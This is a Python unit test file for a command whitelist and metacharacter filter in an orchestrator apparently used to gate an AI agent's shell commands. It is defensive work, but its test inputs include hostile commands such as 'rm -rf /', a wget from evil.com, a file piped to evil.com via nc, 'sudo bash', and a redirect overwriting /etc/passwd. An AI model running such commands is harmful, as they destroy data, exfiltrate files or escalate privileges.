import unittest
import tempfile
import os
from orchestrator import LancelotOrchestrator, COMMAND_WHITELIST, COMMAND_BLACKLIST_CHARS


class TestCommandWhitelist(unittest.TestCase):

    def setUp(self):
        self.data_dir = tempfile.mkdtemp()
        # Create minimal memory files
        for fn in ("USER.md", "RULES.md", "MEMORY_SUMMARY.md"):
            with open(os.path.join(self.data_dir, fn), "w") as f:
                f.write("test")
        self.orch = LancelotOrchestrator(data_dir=self.data_dir)

    def test_ls_allowed(self):
        valid, reason = self.orch._validate_command("ls /tmp")
        self.assertTrue(valid)

    def test_git_allowed(self):
        valid, reason = self.orch._validate_command("git status")
        self.assertTrue(valid)

    def test_echo_allowed(self):
        valid, reason = self.orch._validate_command("echo hello")
        self.assertTrue(valid)

    def test_rm_blocked(self):
        valid, reason = self.orch._validate_command("rm -rf /")
        self.assertFalse(valid)
        self.assertIn("not in the allowed", reason)

    def test_python_blocked(self):
        valid, reason = self.orch._validate_command("python malware.py")
        self.assertFalse(valid)
        self.assertIn("not in the allowed", reason)

    def test_wget_blocked(self):
        valid, reason = self.orch._validate_command("wget http://evil.com/payload")
        self.assertFalse(valid)
        self.assertIn("not in the allowed", reason)

    def test_curl_blocked(self):
        valid, reason = self.orch._validate_command("curl http://evil.com")
        self.assertFalse(valid)
        self.assertIn("not in the allowed", reason)


class TestCommandChaining(unittest.TestCase):

    def setUp(self):
        self.data_dir = tempfile.mkdtemp()
        for fn in ("USER.md", "RULES.md", "MEMORY_SUMMARY.md"):
            with open(os.path.join(self.data_dir, fn), "w") as f:
                f.write("test")
        self.orch = LancelotOrchestrator(data_dir=self.data_dir)

    def test_ampersand_blocked(self):
        valid, reason = self.orch._validate_command("ls && rm -rf /")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_pipe_blocked(self):
        valid, reason = self.orch._validate_command("cat file | nc evil.com 4444")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_semicolon_blocked(self):
        valid, reason = self.orch._validate_command("ls; sudo bash")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_or_chain_blocked(self):
        valid, reason = self.orch._validate_command("false || rm -rf /")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)


class TestShellExpansion(unittest.TestCase):

    def setUp(self):
        self.data_dir = tempfile.mkdtemp()
        for fn in ("USER.md", "RULES.md", "MEMORY_SUMMARY.md"):
            with open(os.path.join(self.data_dir, fn), "w") as f:
                f.write("test")
        self.orch = LancelotOrchestrator(data_dir=self.data_dir)

    def test_dollar_paren_blocked(self):
        valid, reason = self.orch._validate_command("echo $(whoami)")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_backtick_blocked(self):
        valid, reason = self.orch._validate_command("echo `id`")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_dollar_brace_blocked(self):
        valid, reason = self.orch._validate_command("echo ${HOME}")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_redirect_blocked(self):
        valid, reason = self.orch._validate_command("echo hack > /etc/passwd")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)


class TestShlexParsing(unittest.TestCase):

    def setUp(self):
        self.data_dir = tempfile.mkdtemp()
        for fn in ("USER.md", "RULES.md", "MEMORY_SUMMARY.md"):
            with open(os.path.join(self.data_dir, fn), "w") as f:
                f.write("test")
        self.orch = LancelotOrchestrator(data_dir=self.data_dir)

    def test_quoted_string_works(self):
        valid, reason = self.orch._validate_command('echo "hello world"')
        self.assertTrue(valid)

    def test_empty_command_rejected(self):
        valid, reason = self.orch._validate_command("")
        self.assertFalse(valid)


class TestExecuteCommandIntegration(unittest.TestCase):

    def setUp(self):
        self.data_dir = tempfile.mkdtemp()
        for fn in ("USER.md", "RULES.md", "MEMORY_SUMMARY.md"):
            with open(os.path.join(self.data_dir, fn), "w") as f:
                f.write("test")
        self.orch = LancelotOrchestrator(data_dir=self.data_dir)

    def test_blocked_command_returns_security_block(self):
        result = self.orch.execute_command("rm -rf /")
        self.assertIn("SECURITY BLOCK", result)

    def test_chained_command_returns_security_block(self):
        result = self.orch.execute_command("ls && rm -rf /")
        self.assertIn("SECURITY BLOCK", result)


if __name__ == "__main__":
    unittest.main()
